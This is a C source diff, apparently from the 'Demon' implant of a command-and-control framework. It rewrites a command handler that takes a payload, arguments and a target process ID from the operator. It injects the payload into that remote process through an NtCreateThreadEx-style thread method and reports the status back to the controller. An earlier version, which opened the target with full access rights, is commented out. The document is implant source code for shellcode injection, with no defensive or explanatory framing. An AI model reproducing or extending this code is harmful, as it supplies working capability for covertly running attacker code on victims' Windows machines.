@@ -1202,7 +1202,70 @@ VOID CommandSpawnDLL( PPARSER Parser )
 
 VOID CommandInjectShellcode( PPARSER Parser )
 {
-    PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
+    PPACKAGE Package = NULL;
+    DWORD    Status  = 0;
+    BOOL     InjProc = FALSE;
+    DWORD    Method  = 0;
+    BOOL     x64     = FALSE;
+    PVOID    Payload = NULL;
+    DWORD    Size    = 0;
+    PVOID    Argv    = NULL;
+    DWORD    Argc    = 0;
+    DWORD    Pid     = 0;
+
+    /* create response package */
+    Package = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
+
+    /* parse arguments */
+    InjProc  = ParserGetInt32( Parser );
+    Method  = ParserGetInt32( Parser );
+    x64     = ParserGetInt32( Parser );
+    Payload = ParserGetBytes( Parser, &Size );
+    Argv    = ParserGetBytes( Parser, &Argc );
+    Pid     = ParserGetInt32( Parser );
+
+    PRINTF(
+        "Injection Args:      \n"
+        " - Inject  : %s      \n"
+        " - Method  : %d      \n"
+        " - x64     : %s      \n"
+        " - Payload : %p : %d \n"
+        " - Arg     : %p : %d \n"
+        " - Pid     : %d      \n",
+        InjProc ? "TRUE" : "FALSE",
+        Method,
+        x64 ? "TRUE" : "FALSE",
+        Payload, Size,
+        Argv, Argc,
+        Pid
+    )
+
+    /* if we want to inject into a remote process */
+    if ( InjProc )
+    {
+        /* inject code into remote process */
+        Status = Inject(
+            THREAD_METHOD_NTCREATEHREADEX,
+            NULL,
+            Pid,
+            x64,
+            Payload,
+            Size,
+            U_PTR( NULL ),
+            Argv,
+            Argc
+        );
+    }
+    else
+    {
+        /* TODO: spawn process and inject into it */
+    }
+
+
+    PackageAddInt32( Package, Status );
+    PackageTransmit( Package, NULL, NULL );
+
+    /*PPACKAGE      Package        = PackageCreate( DEMON_COMMAND_INJECT_SHELLCODE );
     UINT32        ShellcodeSize  = 0;
     UINT32        ArgumentSize   = 0;
     BOOL          Inject         = ( BOOL )  ParserGetInt32( Parser );
@@ -1224,7 +1287,7 @@ VOID CommandInjectShellcode( PPARSER Parser )
 
     if ( Inject == 1 )
     {
-        /* TODO: instead of using PROCESS_ALL_ACCESS only use VM_OPERATION & PROCESS_CREATE_THREAD */
+        // TODO: instead of using PROCESS_ALL_ACCESS only use VM_OPERATION & PROCESS_CREATE_THREAD
         if ( ( InjectionCtx.hProcess = ProcessOpen( TargetPID, PROCESS_ALL_ACCESS ) ) == INVALID_HANDLE_VALUE ) {
             PACKAGE_ERROR_WIN32
             return;
@@ -1248,7 +1311,7 @@ VOID CommandInjectShellcode( PPARSER Parser )
     PRINTF( "Injection Result => %d", Result )
 
     PackageAddInt32( Package, Result );
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( Package, NULL, NULL );*/
 }
 
 VOID CommandToken( PPARSER Parser )
